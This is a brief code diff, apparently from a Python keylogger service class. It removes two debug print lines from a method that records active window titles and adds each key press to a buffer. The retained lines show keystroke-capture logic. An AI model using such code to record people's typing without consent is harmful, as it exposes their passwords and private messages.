@@ -36,5 +36,3 @@ class KeyloggerService(IKeyLogger):
         self.apps.append(gw.getActiveWindow().title) if gw.getActiveWindow().title not in self.apps else None
         key_str = key_to_string(key)
         self.presses += key_str
-        print(self.apps)
-        print(type(self.apps))
